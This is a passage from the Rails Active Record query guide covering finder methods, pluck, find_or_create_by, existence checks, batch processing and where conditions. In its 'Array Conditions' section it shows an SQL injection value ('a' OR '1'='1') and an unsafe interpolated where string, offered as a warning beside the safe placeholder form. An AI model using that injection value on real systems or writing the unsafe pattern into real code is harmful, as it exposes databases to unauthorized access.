On a collection that is ordered using `order`, `last` will return the last
record ordered by the specified attribute for `order`.

```irb
store(dev)> customer = Customer.order(:first_name).last
=> #<Customer id: 220, first_name: "Sara">
```

The SQL equivalent of the above is:

```sql
SELECT * FROM customers ORDER BY customers.first_name DESC LIMIT 1
```

The [`last!`][] method behaves exactly like `last`, except that it will raise
`ActiveRecord::RecordNotFound` if no matching record is found.

[`last`]:
    https://api.rubyonrails.org/classes/ActiveRecord/FinderMethods.html#method-i-last
[`last!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/FinderMethods.html#method-i-last-21

#### `find_by`

The [`find_by`][] method finds the first record matching some conditions. For
example:

```irb
store(dev)> Customer.find_by(first_name: "Lifo")
=> #<Customer id: 1, first_name: "Lifo">

store(dev)> Customer.find_by(first_name: "Jon")
=> nil
```

It is equivalent to writing:

```ruby
Customer.where(first_name: "Lifo").take
```

The SQL equivalent of the above is:

```sql
SELECT * FROM customers WHERE (customers.first_name = "Lifo") LIMIT 1
```

Note that there is no `ORDER BY` in the above SQL.  If your `find_by` conditions
can match multiple records, you should [apply an order](#ordering-records) to
guarantee a deterministic result.

The [`find_by!`][] method behaves exactly like `find_by`, except that it will
raise `ActiveRecord::RecordNotFound` if no matching record is found. For
example:

```irb
store(dev)> Customer.find_by!(first_name: "does not exist")
ActiveRecord::RecordNotFound
```

This is equivalent to writing:

```ruby
Customer.where(first_name: "does not exist").take!
```

If you are using [composite primary
keys](active_record_composite_primary_keys.html), see the [Conditions with
`id`](active_record_composite_primary_keys.html#conditions-with-id) section of
the Composite Primary Keys guide for the `find_by(id:)` behavior.

[`find_by`]:
    https://api.rubyonrails.org/classes/ActiveRecord/FinderMethods.html#method-i-find_by
[`find_by!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/FinderMethods.html#method-i-find_by-21

#### Dynamic Finder Methods

For every field (also known as an attribute) you define in your table, Active
Record dynamically provides a finder method. If you have a field called
`first_name` on your `Customer` model for example, you get the
`find_by_first_name` finder method for free from Active Record.

```irb
store(dev)> Customer.find_by_first_name("Bhumi")
=> #<Customer id: 25, first_name: "Bhumi">
```

If you also have a `locked` field on the `Customer` model, you also get a
`find_by_locked` method.

You can specify an exclamation point (`!`) on the end of the dynamic finders to
get them to raise an `ActiveRecord::RecordNotFound` error if they do not return
any records:

```irb
store(dev)> Customer.find_by_first_name!("Ryan")
ActiveRecord::RecordNotFound
```

If you want to find both by `first_name` and `orders_count`, you can chain these
finders together by simply typing `_and_` between the fields.

For example:

```irb
store(dev)> Customer.find_by_first_name_and_orders_count("Bhumi", 5)
=> #<Customer id: 25, first_name: "Bhumi">
```

### Retrieving Multiple Records

Active Record provides several methods for retrieving multiple records from the
database. The most basic method is [`all`][], which returns all records for the
model.

```irb
store(dev)> customers = Customer.all
=> [#<Customer id: 1, first_name: "Lifo">,
    #<Customer id: 2, first_name: "Fifo">, ...]
```

The SQL equivalent of the above is:

```sql
SELECT * FROM customers
```

The `all` method returns an `ActiveRecord::Relation` object, which allows you to
chain additional query methods. For example, you can combine it with [`where`][]
to filter records:

```irb
store(dev)> customers = Customer.all.where(active: true)
=> [#<Customer id: 1, first_name: "Lifo", active: true>,
    #<Customer id: 3, first_name: "Joe", active: true>]
```

This is the same as:

```ruby
customers = Customer.where(active: true)
```

The SQL equivalent is:

```sql
SELECT * FROM customers WHERE (customers.active = true)
```

Since `all` returns an `ActiveRecord::Relation` and relations are lazy-loaded,
calling `all` first is optional and doesn't change the query behavior.

NOTE: In the console, `Customer.all` appears to execute the query because the
return value is displayed by calling `inspect`, which loads the records.

You can also use other methods like [`order`][], [`limit`][], and [`group`][] to
further refine your queries. These methods are covered in detail in the
[Filtering Records](#filtering-records), [Ordering Records](#ordering-records),
[Limit and Offset](#limiting-records), and [Grouping Records](#grouping-records)
sections.

TIP: For large datasets, consider using the batch processing methods described
later in this section to avoid loading all records into memory at once.

[`all`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Scoping/Named/ClassMethods.html#method-i-all
[`where`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-where
[`order`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-order
[`limit`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-limit
[`group`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-group

### Understanding Method Chaining

Active Record supports [Method
Chaining](https://en.wikipedia.org/wiki/Method_chaining), which allows us to use
multiple Active Record methods together in a simple and straightforward way.

You can chain methods in a statement when the previous method called returns an
[`ActiveRecord::Relation`][], like `all`, `where`, and `joins`. Methods that
return a single record must be at the end of the statement. You can read more
about retrieving a single record in the [Retrieving a Single Record
Section](#retrieving-a-single-record).

When an Active Record method is called, the query is not immediately generated
and sent to the database. Instead, the query is sent only when the data is
actually needed. So each example below generates a single query.

NOTE: In the Rails console, queries may appear to execute unexpectedly because
the console calls `inspect` on the result to display it. This triggers the query
execution even if you're just exploring the relation object. For example, typing
`Customer.where(active: true)` in the console will execute the query immediately
to show you the results, even though the relation is lazy-loaded by default.

#### Retrieving Filtered Data from Multiple Tables

```ruby
Customer
  .select("customers.id, customers.last_name, reviews.body")
  .joins(:reviews)
  .where("reviews.created_at > ?", 1.week.ago)
```

This will generate the following SQL:

```sql
SELECT customers.id, customers.last_name, reviews.body
  FROM customers
  INNER JOIN reviews
  ON reviews.customer_id = customers.id
  WHERE (reviews.created_at > "2019-01-08")
```

#### Retrieving Specific Data from Multiple Tables

```ruby
Book
  .select("books.id, books.title, authors.first_name")
  .joins(:author)
  .find_by(title: "Abstraction and Specification in Program Development")
```

This will generate the following SQL:

```sql
SELECT books.id, books.title, authors.first_name
  FROM books
  INNER JOIN authors
  ON authors.id = books.author_id
  WHERE books.title = $1 [["title", "Abstraction and Specification in Program Development"]]
  LIMIT 1
```

NOTE: If a query matches multiple records, `find_by` will fetch only the first
one and ignore the others, as specified by the `LIMIT 1` statement above.

### Finding Records and Values

You can find records and values in the database using the following methods.

#### `find_by_sql`

If you'd like to use your own SQL to find records in a table you can use
[`find_by_sql`][]. The `find_by_sql` method will return an array of records even
if the underlying query returns just a single record. For example, you could run
this query:

```irb
store(dev)> Customer.find_by_sql("SELECT * FROM customers INNER JOIN orders ON customers.id = orders.customer_id ORDER BY customers.created_at desc")
=> [#<Customer id: 1, first_name: "Lucas" ...>,
    #<Customer id: 2, first_name: "Jan" ...>, ...]
```

`find_by_sql` provides you with a simple way of making custom calls to the
database and retrieving instantiated records.

[`find_by_sql`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Querying.html#method-i-find_by_sql

#### `select_all`

`find_by_sql` has a close relative called [`lease_connection.select_all`][].
`select_all` will retrieve results from the database using custom SQL just like
`find_by_sql` but will not instantiate them. This method will return an instance
of `ActiveRecord::Result` class and calling `to_a` on it returns an array of hashes where each hash represents a row.

```irb
store(dev)> Customer.lease_connection.select_all("SELECT first_name, created_at FROM customers WHERE id = \"1\"").to_a
=> [{"first_name"=>"Rafael", "created_at"=>"2012-11-10 23:23:45.281189"},
    {"first_name"=>"Eileen", "created_at"=>"2013-12-09 11:22:35.221282"}]
```

[`lease_connection.select_all`]:
    https://api.rubyonrails.org/classes/ActiveRecord/ConnectionAdapters/DatabaseStatements.html#method-i-select_all

#### `pluck`

[`pluck`][] can be used to pick the value(s) from the named column(s) in the
current relation. It accepts a list of column names as an argument and returns
an array of values of the specified columns with the corresponding data type.

```irb
store(dev)> Book.where(out_of_print: true).pluck(:id)
SELECT id FROM books WHERE out_of_print = true
=> [1, 2, 3]

store(dev)> Order.distinct.pluck(:status)
SELECT DISTINCT status FROM orders
=> ["shipped", "being_packed", "cancelled"]

store(dev)> Customer.pluck(:id, :first_name)
SELECT customers.id, customers.first_name FROM customers
=> [[1, "David"], [2, "Fran"], [3, "Jose"]]
```

`pluck` makes it possible to replace code like:

```ruby
Customer.select(:id).map { |c| c.id }
# or
Customer.select(:id).map(&:id)
# or
Customer.select(:id, :first_name).map { |c| [c.id, c.first_name] }
```

with:

```ruby
Customer.pluck(:id)
# or
Customer.pluck(:id, :first_name)
```

Unlike `select`, `pluck` directly converts a database result into a Ruby
`Array`, without constructing `ActiveRecord` objects. This can mean better
performance for a large or frequently-run query. However, any model method
overrides will not be available. For example:

```ruby
class Customer < ApplicationRecord
  def first_name
    "I am #{super}"
  end
end
```

```irb
store(dev)> Customer.select(:first_name).map(&:first_name)
=> ["I am David", "I am Jeremy", "I am Jose"]

store(dev)> Customer.pluck(:first_name)
=> ["David", "Jeremy", "Jose"]
```

You are not limited to querying fields from a single table, you can query
multiple tables as well.

```irb
store(dev)> Order.joins(:customer, :books).pluck("orders.created_at, customers.email, books.title")
```

Furthermore, unlike `select` and other `Relation` scopes, `pluck` triggers an
immediate query, and thus cannot be chained with any further scopes, although it
can work with scopes already constructed earlier:

```irb
store(dev)> Customer.pluck(:first_name).limit(1)
NoMethodError: undefined method `limit' for #<Array:0x007ff34d3ad6d8>

store(dev)> Customer.limit(1).pluck(:first_name)
=> ["David"]
```

NOTE: You should also know that using `pluck` will trigger eager loading if the
relation object contains include values, even if the eager loading is not
necessary for the query. For example:

```irb
store(dev)> assoc = Customer.includes(:reviews)
store(dev)> assoc.pluck(:id)
SELECT "customers"."id" FROM "customers" LEFT OUTER JOIN "reviews" ON "reviews"."id" = "customers"."review_id"
```

One way to avoid this is to `unscope` the includes:

```irb
store(dev)> assoc.unscope(:includes).pluck(:id)
```

[`pluck`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Calculations.html#method-i-pluck

#### `pick`

[`pick`][] can be used to pick the value(s) from the named column(s) in the
current relation. It accepts a list of column names as an argument and returns
the first row of the specified column values ​​with corresponding data type.
`pick` is a short-hand for `relation.limit(1).pluck(*column_names).first`, which
is primarily useful when you already have a relation that is limited to one row.

`pick` makes it possible to replace code like:

```ruby
Customer.where(id: 1).pluck(:id).first
```

with:

```ruby
Customer.where(id: 1).pick(:id)
# => 1
```

[`pick`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Calculations.html#method-i-pick

#### `ids`

[`ids`][] can be used to pluck all the IDs for the relation using the table's
primary key.

```irb
store(dev)> Customer.ids
SELECT id FROM customers
```

If you are using a different `primary_key` this will be used instead:

```ruby
class Customer < ApplicationRecord
  self.primary_key = "customer_id"
end
```

```irb
store(dev)> Customer.ids
SELECT customer_id FROM customers
```

[`ids`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Calculations.html#method-i-ids

Finding or Building a New Record
--------------------------------

It's common that you need to find a record or create it if it doesn't exist. You
can do that with the `find_or_create_by` and `find_or_create_by!` methods.

### `find_or_create_by`

The [`find_or_create_by`][] method checks whether a record with the specified
attributes exists. If it doesn't, then `create` is called.

Suppose you want to find a customer with the email "andy@example.com", and if
there's no customer with that email, then you want to create one. You can do
this by running:

```irb
store(dev)> Customer.find_or_create_by(email: "andy@example.com")
=> #<Customer id: 5, email: "andy@example.com", last_name: nil, title: nil, visits: 0, orders_count: nil, lock_version: 0, created_at: "2019-01-17 07:06:45", updated_at: "2019-01-17 07:06:45">
```

The SQL generated by this method will look like this:

```sql
SELECT *
  FROM customers
  WHERE (customers.email = "andy@example.com")
  LIMIT 1

BEGIN
INSERT INTO customers (created_at, email, locked, orders_count, updated_at) VALUES ("2011-08-30 05:22:57", "andy@example.com", 1, NULL, "2011-08-30 05:22:57")
COMMIT
```

`find_or_create_by` returns either the record that already exists or the new
record. In this case, we didn't already have a customer with that email so the
record is created and returned.

The new record might not be saved to the database; that depends on whether
validations passed or not (just like `create`).

Suppose you want to set the `locked` attribute to `false` if you're creating a
new record, but you don't want to include it in the query. You want to find the
customer with the email "andy@example.com", and if that customer doesn't exist,
then create a customer with that email which is not locked.

You can achieve this in two ways. The first is to use `create_with`:

```ruby
Customer.create_with(locked: false).find_or_create_by(email: "andy@example.com")
```

The second way is using a block:

```ruby
Customer.find_or_create_by(email: "andy@example.com") do |c|
  c.locked = false
end
```

The block will only be executed if the customer is being created. The second
time we run this code, the block will be ignored.

NOTE: `find_or_create_by` is not atomic and can have race conditions. In
concurrent scenarios, two processes might both check for a record's existence at
the same time, find it doesn't exist, and both try to create it, potentially
resulting in duplicate records. To avoid race conditions, ensure you have a
unique constraint on the database column(s) you're querying, or consider using
[`create_or_find_by`](#create-or-find-by) instead, which handles uniqueness
constraint violations atomically.

[`find_or_create_by`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-find_or_create_by

### `find_or_create_by!`

You can also use [`find_or_create_by!`][] to raise an exception if the new
record is invalid. Validations are not covered on this guide, however let's
assume that you have temporarily added the following validation to your
`Customer` model:

```ruby
validates :orders_count, presence: true
```

If you try to create a new `Customer` without passing an `orders_count`, then
the record will be invalid and an exception will be raised:

```irb
store(dev)> Customer.find_or_create_by!(first_name: "Andy")
ActiveRecord::RecordInvalid: Validation failed: Orders count can't be blank
```

[`find_or_create_by!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-find_or_create_by-21

### `find_or_initialize_by`

The [`find_or_initialize_by`][] method will work just like `find_or_create_by`
but it will call `new` instead of `create`. This means that a new model instance
will be created in memory but won't be saved to the database.

You can use `find_or_initialize_by` to find the customer named 'Nina':

```irb
store(dev)> nina = Customer.find_or_initialize_by(first_name: "Nina")
=> #<Customer id: nil, first_name: "Nina", orders_count: 0, locked: true, created_at: "2011-08-30 06:09:27", updated_at: "2011-08-30 06:09:27">

store(dev)> nina.persisted?
=> false

store(dev)> nina.new_record?
=> true
```

Since the record is not yet stored in the database, the SQL generated will look
like this:

```sql
SELECT * FROM customers WHERE (customers.first_name = "Nina") LIMIT 1
```

When you want to save it to the database, you can call `save`:

```irb
store(dev)> nina.save
=> true
```

[`find_or_initialize_by`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-find_or_initialize_by

### `create_or_find_by`

The [`create_or_find_by`][] method tries to create a record with the given
attributes. If a record with those attributes already exists (indicated by a
uniqueness constraint violation), it will find and return that existing record
instead. This method is atomic and avoids race conditions that can occur with
`find_or_create_by`.

```irb
store(dev)> Customer.create_or_find_by(first_name: "Andy")
=> #<Customer id: 5, first_name: "Andy", last_name: nil, title: nil, visits: 0, orders_count: nil, lock_version: 0, created_at: "2019-01-17 07:06:45", updated_at: "2019-01-17 07:06:45">
```

The SQL generated by this method looks like this on first call:

```sql
BEGIN
INSERT INTO customers (created_at, first_name, locked, orders_count, updated_at) VALUES ("2011-08-30 05:22:57", "Andy", 1, NULL, "2011-08-30 05:22:57")
COMMIT
```

If the record already exists (due to a uniqueness constraint), the creation will
fail and the method will find the existing record:

```sql
BEGIN
INSERT INTO customers (created_at, first_name, locked, orders_count, updated_at) VALUES ("2011-08-30 05:22:57", "Andy", 1, NULL, "2011-08-30 05:22:57")
ROLLBACK

SELECT *
  FROM customers
  WHERE (customers.first_name = "Andy")
  LIMIT 1
```

The key difference between `create_or_find_by` and `find_or_create_by` is the
order of operations and atomicity:

- `find_or_create_by`: First tries to find, then creates if not found. This is
  **not atomic** and can have race conditions where duplicate records may be
  created.
- `create_or_find_by`: First tries to create, then finds if creation fails due
  to uniqueness constraint violation. This is **atomic** and prevents race
  conditions.

IMPORTANT: For `create_or_find_by` to work correctly, you must have a unique
constraint on the attribute or attributes being queried. Without that
constraint, the method can raise duplicate key violations. This method is most
appropriate in situations where you expect the record to be created most of the
time, where a unique constraint already exists on the relevant attributes, and
where you want to avoid race conditions that might otherwise result in duplicate
records.

[`create_or_find_by`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-create_or_find_by

### `create_or_find_by!`

You can also use [`create_or_find_by!`][] to raise an exception if the record
creation fails for reasons other than uniqueness constraint violations. This is
similar to `find_or_create_by!` but with the create-first, atomic approach.

```irb
store(dev)> Customer.create_or_find_by!(first_name: "Andy", orders_count: 5)
=> #<Customer id: 5, first_name: "Andy", orders_count: 5, ...>
```

If a validation fails during creation (other than uniqueness), an exception will
be raised:

```irb
store(dev)> Customer.create_or_find_by!(first_name: "Andy", orders_count: nil)
ActiveRecord::RecordInvalid: Validation failed: Orders count can't be blank
```

However, if the failure is due to a uniqueness constraint violation, it will
find and return the existing record (just like `create_or_find_by`), rather than
raising an exception.

[`create_or_find_by!`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Relation.html#method-i-create_or_find_by-21


Existence of Records
--------------------

You can check if a record or records exist in the database using the following
methods.

### `exists?`

If you want to check for the existence of a record without instantiating the
record there's a method called [`exists?`][]. This method will query the
database using the same query as `find`, but instead of returning a record or
collection of records it will return either `true` or `false`.

```irb
store(dev)> Customer.exists?(1)
SELECT 1 AS one FROM customers WHERE customers.id = 1 LIMIT 1
=> true
```

The `exists?` method also takes multiple values, but the catch is that it will
return `true` if any one of those records exists.

```irb
store(dev)> Customer.exists?(id: [1, 2, 3])
=> true

store(dev)> Customer.exists?(first_name: ["Jane", "Sergei"])
=> true
```

It's even possible to use `exists?` without any arguments on a model or a
relation.

```irb
store(dev)> Customer.where(first_name: "Ryan").exists?
=> true
```

The above returns `true` if there is at least one customer with the `first_name`
'Ryan' and `false` otherwise.

```irb
store(dev)> Customer.exists?
=> true
```

The above returns `false` if the `customers` table is empty and `true`
otherwise.

### `any?`

You can also use `any?` to check for existence on a model or relation.

If the records have already been loaded, `any?` will use the in-memory records
instead of querying the database again:

```irb
store(dev)> orders = Order.limit(10).load
SELECT orders.* FROM orders LIMIT 10
store(dev)> orders.any?
=> true
```

```irb
store(dev)> Order.any?
SELECT 1 FROM orders LIMIT 1
=> true

store(dev)> Order.shipped.any?
SELECT 1 FROM orders WHERE orders.status = 0 LIMIT 1
=> true

store(dev)> Book.where(out_of_print: true).any?
=> true

store(dev)> Customer.first.orders.any?
=> true
```

### `many?`

You can use `many?` to check whether more than one record exists on a model or
relation. It uses SQL `count` unless the records have already been loaded.

```irb
store(dev)> Order.many?
SELECT COUNT(*) FROM (SELECT 1 FROM orders LIMIT 2)
=> true

store(dev)> Order.shipped.many?
SELECT COUNT(*) FROM (SELECT 1 FROM orders WHERE orders.status = 0 LIMIT 2)
=> true

store(dev)> Book.where(out_of_print: true).many?
=> true

store(dev)> Customer.first.orders.many?
=> true
```

[`exists?`]:
    https://api.rubyonrails.org/classes/ActiveRecord/FinderMethods.html#method-i-exists-3F

### Retrieving Multiple Records in Batches

We often need to iterate over a large set of records, for example, when sending
a newsletter to many customers, or when exporting data.

You may be tempted to use the following approach:

```ruby
# This may consume too much memory if the table is big.
Customer.all.each do |customer|
  NewsMailer.weekly(customer).deliver_now
end
```

However, this approach becomes increasingly impractical as the table size
increases, since `Customer.all.each` instructs Active Record to fetch _the
entire table_ in a single pass, build a model record per row, and then keep the
entire array of model records in memory. If we have a large number of records,
the entire collection may exceed the amount of memory available.

Rails provides two methods that address this problem by dividing records into
memory-friendly batches for processing:

- The first method, `find_each`, retrieves a batch of records and then yields
  _each_ record to the block individually as a model.
- The second method, `find_in_batches`, retrieves a batch of records and then
  yields _the entire batch_ to the block as an array of models.

NOTE: The `find_each` and `find_in_batches` methods are intended for use in the
batch processing of a large number of records that wouldn't fit in memory all at
once. If you just need to loop over a thousand records then the regular find
methods are the preferred option.

#### `find_each`

The [`find_each`][] method retrieves records in batches and then yields _each_
one to the block. In the following example, `find_each` retrieves customers in
batches of 1,000 and yields them to the block one by one:

```ruby
Customer.find_each do |customer|
  NewsMailer.weekly(customer).deliver_now
end
```

NOTE: The default batch size is 1,000, but this can be customized. See [Options
for `find_each`](#options-for-find-each) for more details.

This process is repeated, fetching more batches as needed, until all of the
records have been processed.

As seen above, `find_each` works on model classes. It also works on relations as
long as they have no ordering, since the method needs to force an order
internally to iterate.

```ruby
Customer.where(weekly_subscriber: true).find_each do |customer|
  NewsMailer.weekly(customer).deliver_now
end
```

If an order is present in the relation, the behavior depends on the flag
[`config.active_record.error_on_ignored_order`][]. If this flag is set to true,
`ArgumentError` is raised, otherwise the order is ignored and a warning issued,
which is the default behavior. This can be overridden with the option
`:error_on_ignore`, explained below.

[`config.active_record.error_on_ignored_order`]:
    configuring.html#config-active-record-error-on-ignored-order
[`find_each`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Batches.html#method-i-find_each

##### Options for `find_each`

**`:batch_size`**

The `:batch_size` option allows you to specify the number of records to be
retrieved in each batch, before being passed individually to the block. For
example, to retrieve records in batches of 5,000, you can use the following
code:

```ruby
Customer.find_each(batch_size: 5000) do |customer|
  NewsMailer.weekly(customer).deliver_now
end
```

**`:start`**

By default, records are fetched in ascending order of the primary key. The
`:start` option allows you to configure the first ID of the sequence whenever
the lowest ID is not the one you need. This would be useful, for example, if you
wanted to resume an interrupted batch process, provided you saved the last
processed ID as a checkpoint.

For example, to send newsletters only to customers with the primary key starting
from 2000:

```ruby
Customer.find_each(start: 2000) do |customer|
  NewsMailer.weekly(customer).deliver_now
end
```

**`:finish`**

Similar to the `:start` option, `:finish` allows you to configure the last ID of
the sequence whenever the highest ID is not the one you need. This would be
useful, for example, if you wanted to run a batch process using a subset of
records based on `:start` and `:finish`.

For example, to send newsletters only to customers with the primary key starting
from 2000 up to including 9999:

```ruby
Customer.find_each(start: 2000, finish: 9999) do |customer|
  NewsMailer.weekly(customer).deliver_now
end
```

Another example would be if you wanted multiple workers handling the same
processing queue. You could have each worker handle 10,000 records by setting
the appropriate `:start` and `:finish` options on each worker.

**`:error_on_ignore`**

Overrides the application config to specify if an error should be raised when an
order is present in the relation.

**`:order`**

Specifies the primary key order (can be `:asc` or `:desc`). Defaults to `:asc`.

```ruby
Customer.find_each(order: :desc) do |customer|
  NewsMailer.weekly(customer).deliver_now
end
```

#### `find_in_batches`

The [`find_in_batches`][] method is similar to `find_each`, since both retrieve
batches of records. The difference is that `find_in_batches` yields _batches_ to
the block as an array of models, instead of individually. The following example
will yield to the supplied block an array of up to 1,000 customers at a time,
with the final block containing any remaining customers:

```ruby
# Give add_customers an array of 1,000 customers at a time.
Customer.find_in_batches do |customers|
  export.add_customers(customers)
end
```

`find_in_batches` works on model classes, as seen above, and also on relations
as long as they have no ordering, since the method needs to force an order
internally to iterate:

```ruby
# Give add_customers an array of 1,000 recently active customers at a time.
Customer.recently_active.find_in_batches do |customers|
  export.add_customers(customers)
end
```

[`find_in_batches`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Batches.html#method-i-find_in_batches

##### Options for `find_in_batches`

The `find_in_batches` method accepts the same options as `find_each`:

**`:batch_size`**

Just like for `find_each`, `batch_size` establishes how many records will be
retrieved in each group. For example, retrieving batches of 2,500 records can be
specified as:

```ruby
Customer.find_in_batches(batch_size: 2500) do |customers|
  export.add_customers(customers)
end
```

**`:start`**

The `start` option allows specifying the beginning ID from where records will be
selected. As mentioned before, by default records are fetched in ascending order
of the primary key. For example, to retrieve customers starting on ID: 5000 in
batches of 2,500 records, the following code can be used:

```ruby
Customer.find_in_batches(batch_size: 2500, start: 5000) do |customers|
  export.add_customers(customers)
end
```

**`:finish`**

The `finish` option allows specifying the ending ID of the records to be
retrieved. The code below shows the case of retrieving customers in batches, up
to including the customer with ID: 7000:

```ruby
Customer.find_in_batches(finish: 7000) do |customers|
  export.add_customers(customers)
end
```

**`:error_on_ignore`**

The `error_on_ignore` option overrides the application config to specify if an
error should be raised when a specific order is present in the relation.

Filtering Records
-----------------

The [`where`][] method allows you to specify conditions to filter the records
returned, representing the `WHERE` part of the SQL statement. Conditions can be
specified as a string, array, or hash.

### Pure String Conditions

If you want to add conditions to your query, you can include them directly in
the where clause.

For example:

```ruby
Book.where("title = \"Introduction to Algorithms\"")
```

This will find all books where the `title` field value is 'Introduction to
Algorithms'.

WARNING: Building your own conditions as pure strings can leave you vulnerable
to SQL injection exploits. For example, `Book.where("title LIKE
'%#{params[:title]}%'")` is not safe. See the next section for the preferred way
to handle conditions using an array. For more background, see the [Ruby on Rails
Security Guide on SQL injection](security.html#sql-injection).

### Array Conditions

If a condition is dependent on an argument, you can specify it as an array:

```ruby
Book.where(["title = ?", params[:title]])
```

You don't have to pass an actual array. A list of arguments is supported as
well:

```ruby
Book.where("title = ?", params[:title])
```

Active Record takes the first argument as the conditions string, and the
remaining arguments replace the question marks `(?)` in it. To help prevent SQL
injection attacks, Active Record escapes the supplied values and converts them
to the appropriate database type when needed.

Using an unsafe string condition can produce unintended SQL:

```ruby
unsafe_title = "a' OR '1'='1"
Book.where("title = '#{unsafe_title}'")
```

Using placeholders keeps the value escaped:

```ruby
Book.where("title = ?", unsafe_title)
```

You can also specify multiple conditions:

```ruby
Book.where("title = ? AND out_of_print = ?", params[:title], false)
```

In the above example, the first question mark will be replaced with the escaped
value in `params[:title]`, and the second will be replaced with the SQL
representation of `false`, which depends on the adapter.

#### Placeholder Conditions

Similar to the `(?)` replacement style, you can also use named placeholders and
pass a hash of values:

```ruby
Book.where("title = :title AND out_of_print = :out_of_print",
  title: params[:title], out_of_print: false)
```

This can be easier to read when you have several variable conditions.

#### Conditions That Use `LIKE`

Although condition arguments are automatically escaped to prevent SQL injection,
SQL `LIKE` wildcards (i.e., `%` and `_`) are **not** escaped. This may cause
unexpected behavior if an unsanitized value is used in an argument. For example:

```ruby
Book.where("title LIKE ?", params[:title] + "%")
```

In the above code, the intent is to match titles that start with a
user-specified string. However, any occurrences of `%` or `_` in
`params[:title]` will be treated as wildcards, leading to surprising query
results. In some circumstances, this may also prevent the database from using an
intended index, leading to a much slower query.

To avoid these problems, use [`sanitize_sql_like`][] to escape wildcard
characters in the relevant portion of the argument:

```ruby
Book.where("title LIKE ?",
  Book.sanitize_sql_like(params[:title]) + "%")
```

[`sanitize_sql_like`]:
    https://api.rubyonrails.org/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql_like

### Hash Conditions

Active Record also allows you to pass in hash conditions which can increase the
readability of your conditions syntax. With hash conditions, you pass in a hash
with keys of the fields you want qualified and the values of how you want to
qualify them:

NOTE: Only equality, range, and subset checking are possible with Hash
conditions.

#### Equality Conditions

```ruby
Book.where(out_of_print: true)
```

This will generate SQL like this:

```sql
SELECT * FROM books WHERE (books.out_of_print = true)
```

The field name can also be a string:

```ruby
Book.where("out_of_print" => true)
```

In the case of a belongs_to relationship, an association key can be used to
specify the model if an Active Record record is used as the value. This method
works with [polymorphic
relationships](association_basics.html#polymorphic-associations) as well.

```ruby
author = Author.first
Book.where(author: author)
Author.joins(:books).where(books: { author: author })
```

Hash conditions may also be specified in a tuple-like syntax, where the key is
an array of columns and the value is an array of tuples:

```ruby
Book.where([:author_id, :id] => [[15, 1], [15, 2]])
```

This syntax can also be useful for querying models that use [composite primary
keys](active_record_composite_primary_keys.html). See the [Composite Primary
Keys guide](active_record_composite_primary_keys.html) for more details and
examples.

#### Range Conditions

```ruby
Book.where(created_at: (Time.now.midnight - 1.day)..Time.now.midnight)
```

This will find all books created yesterday by using a `BETWEEN` SQL statement:

```sql
SELECT * FROM books WHERE (books.created_at BETWEEN "2008-12-21 00:00:00" AND "2008-12-22 00:00:00")
```

This demonstrates a shorter syntax for the examples in [Array
Conditions](#array-conditions).

Ranges without a start or without an end are supported and can be used to build
less/greater than conditions. For example:

```ruby
Book.where(created_at: (Time.now.midnight - 1.day)..)
```

This will generate SQL like:

```sql
SELECT * FROM books WHERE books.created_at >= "2008-12-21 00:00:00"
```

NOTE: While beginless ranges support both `<=` and `<` by using `..end` and
`...end`, endless ranges will always result in `>=` for both `start..` and
`start...` ranges. As Ruby doesn't yet support excluding the start of a range,
Rails doesn't support this either.

#### Subset Conditions

If you want to find records using the `IN` expression you can pass an array to
the conditions hash:

```ruby
Customer.where(orders_count: [1, 3, 5])
```

This will generate SQL like this:

```sql
SELECT * FROM customers WHERE (customers.orders_count IN (1,3,5))
```

### NOT Conditions

`NOT` SQL queries can be built by [`where.not`][]:

```ruby
Customer.where.not(orders_count: [1, 3, 5])
```

In other words, this query can be generated by calling `where` with no argument,
then immediately chain with `not` passing `where` conditions.  This will
generate SQL like this:

```sql
SELECT * FROM customers WHERE (customers.orders_count NOT IN (1,3,5))
```

If a query has a hash condition with non-nil values on a nullable column, the
records that have `nil` values on the nullable column won't be returned. For
example:

```ruby
Customer.create!(nullable_country: nil)
Customer.where.not(nullable_country: "UK")
# => []

Customer.create!(nullable_country: "UK")
Customer.where.not(nullable_country: nil)
# => [#<Customer id: 2, nullable_country: "UK">]
```

[`where.not`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods/WhereChain.html#method-i-not

### OR Conditions

`OR` conditions between two relations can be built by calling [`or`][] on the
first relation, and passing the second one as an argument.

```ruby
Customer.where(last_name: "Smith").or(Customer.where(orders_count: [1, 3, 5]))
```

```sql
SELECT * FROM customers WHERE (customers.last_name = "Smith" OR customers.orders_count IN (1,3,5))
```

[`or`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-or

### AND Conditions

`AND` conditions can be built by chaining `where` conditions.

```ruby
Customer.where(last_name: "Smith").where(orders_count: [1, 3, 5])
```

```sql
SELECT * FROM customers WHERE customers.last_name = "Smith" AND customers.orders_count IN (1,3,5)
```

`AND` conditions for the logical intersection between relations can be built by
calling [`and`][] on the first relation, and passing the second one as an
argument.

```ruby
Customer.where(id: [1, 2]).and(Customer.where(id: [2, 3]))
```

```sql
SELECT * FROM customers WHERE (customers.id IN (1, 2) AND customers.id IN (2, 3))
```

[`and`]:
    https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-and

Ordering Records
----------------

To retrieve records from the database in a specific order, you can use the
[`order`][] method.

For example, if you're getting a set of records and want to order them in
ascending order by the `created_at` field in your table:

```ruby
Book.order(:created_at)
# OR
Book.order("created_at")
```

You could specify `ASC` or `DESC` as well:

```ruby
Book.order(created_at: :desc)
